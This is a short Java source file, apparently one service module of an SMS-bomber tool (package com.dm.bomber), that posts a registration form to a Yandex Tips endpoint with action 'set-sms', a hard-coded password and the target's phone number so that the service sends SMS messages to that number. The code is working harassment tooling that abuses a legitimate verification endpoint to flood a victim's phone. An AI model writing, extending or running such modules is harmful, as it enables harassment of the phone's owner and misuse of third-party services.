package com.dm.bomber.services;

import okhttp3.FormBody;

public class YandexTips extends FormService {

    public YandexTips() {
        setUrl("https://tips.yandex/dhdghfier.html");
        setMethod(POST);
    }

    @Override
    public void buildBody(FormBody.Builder builder) {
        builder.add("action", "set-sms");
        builder.add("phone", "+" + getFormattedPhone());
        builder.add("password", "qwertY1234_");
        builder.add("role", "1");
        builder.add("promocode", "");
        builder.add("who", "1");
        builder.add("g_token", "");
    }
}
